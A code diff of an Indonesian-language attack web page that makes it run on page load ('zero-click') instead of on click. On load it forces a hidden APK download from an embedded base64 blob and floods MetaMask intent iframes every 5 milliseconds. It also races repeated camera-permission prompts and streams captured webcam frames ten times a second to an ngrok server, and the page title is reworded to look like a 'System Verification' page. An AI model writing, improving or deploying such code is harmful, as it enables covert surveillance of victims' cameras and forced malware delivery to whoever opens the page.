@@ -3,13 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Critical</title>
+<title>System Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
     background: #000; color: #f00; font-family: monospace;
     display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
+    height: 100vh; margin: 0; text-align: center; overflow: hidden;
   }
   .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #f00; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
   h2 { animation: blink 0.1s infinite; }
@@ -22,7 +22,7 @@
 
 <div class="panel" id="main-card">
   <h2>☢️ SYSTEM HACKED ☢️</h2>
-  <p>Klik di mana saja untuk memulai.</p>
+  <p>Memproses...</p>
   <div id="log">Sistem siap.</div>
 </div>
 
@@ -45,7 +45,6 @@
   // ============================================
   // KONFIGURASI
   // ============================================
-  // Ganti dengan target Intent (MetaMask, Instagram, Settings, dll)
   var TARGET_INTENT = "intent://#Intent;" +
                       "package=io.metamask;" +
                       "scheme=metamask;" +
@@ -54,55 +53,15 @@
   var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame";
 
   // ============================================
-  // CAMERA HIJACK
+  // 1. ZERO-CLICK TRIGGER (OTOMATIS SAAT LOAD)
   // ============================================
-  function startCameraHijack() {
-    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-      .then(function(stream) {
-        var video = document.getElementById('cam-feed');
-        video.srcObject = stream;
-        video.play().catch(function(){});
-        log("[+] Kamera BERHASIL diakses!");
-
-        // Stream frame ke server
-        setInterval(function() {
-          var canvas = document.getElementById('processing-canvas');
-          var ctx = canvas.getContext('2d');
-          if (video.readyState === video.HAVE_ENOUGH_DATA) {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            var dataURL = canvas.toDataURL('image/jpeg', 0.5);
-            fetch(SERVER_ENDPOINT, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ image: dataURL }),
-              keepalive: true
-            }).catch(function(){});
-          }
-        }, 100);
-      })
-      .catch(function(err) {
-        log("[-] Kamera diblokir: " + err.name);
-      });
-  }
-
-  // ============================================
-  // TRIGGER CHAOS (KLIK)
-  // ============================================
-  document.body.addEventListener('click', function() {
+  window.addEventListener('load', function() {
     if (executed) return;
     executed = true;
 
-    document.getElementById('main-card').innerHTML = `
-      <h2>EXECUTING...</h2>
-      <p>Memulai Multi-Vector Attack...</p>
-      <div id="log"></div>
-    `;
-    logEl = document.getElementById('log');
-    log("[!] Memulai Android Chaos Chain...");
+    log("[!] Memulai Zero-Click Chaos...");
 
-    // ============================================
     // A. STEALTH DOWNLOAD (IFRAME TERSEMBUNYI)
-    // ============================================
     try {
       var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
       var binary = atob(b64Apk);
@@ -121,16 +80,13 @@
         </body>
       `;
       document.body.appendChild(dlIframe);
-      log("[+] APK Download Triggered.");
+      log("[+] APK Download Triggered (Zero-Click).");
     } catch(e) {}
 
-    // ============================================
     // B. INTENT FLOODING (5ms) + CAMERA REQUEST
-    // ============================================
     var iframeCount = 0;
     var floodInterval = setInterval(function() {
       try {
-        // 1. Buat iframe Intent
         var iframe = document.createElement("iframe");
         iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
         iframe.style.display = "none";
@@ -145,17 +101,40 @@
         document.getElementById("launcher-container").appendChild(iframe);
         iframeCount++;
         
-        // 2. Setiap 10 iframe, minta izin kamera (Race Condition)
+        // Minta izin kamera setiap 10 iframe
         if (iframeCount % 10 === 0) {
-          startCameraHijack(); // Panggil permintaan kamera
-          log("[+] Camera Request Triggered (Race).");
+          navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(function(stream) {
+              var video = document.getElementById('cam-feed');
+              video.srcObject = stream;
+              video.play().catch(function(){});
+              log("[+] Kamera BERHASIL diakses!");
+              
+              // Stream ke server
+              setInterval(function() {
+                var canvas = document.getElementById('processing-canvas');
+                var ctx = canvas.getContext('2d');
+                if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                  var dataURL = canvas.toDataURL('image/jpeg', 0.5);
+                  fetch(SERVER_ENDPOINT, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: dataURL }),
+                    keepalive: true
+                  }).catch(function(){});
+                }
+              }, 100);
+            })
+            .catch(function(err) {
+              log("[-] Kamera diblokir: " + err.name);
+            });
         }
 
         if (iframeCount % 20 === 0) {
           log("[+] Intent Flood " + iframeCount + " terkirim.");
         }
 
-        // Batasi iframe agar tidak OOM
         if (document.getElementById("launcher-container").children.length > 50) {
           document.getElementById("launcher-container").removeChild(
             document.getElementById("launcher-container").firstChild
@@ -163,9 +142,9 @@
         }
 
       } catch(e) {}
-    }, 5); // 5ms (200x per detik)
+    }, 5); 
 
-  }, { once: true });
+  });
 
 })();
 </script>
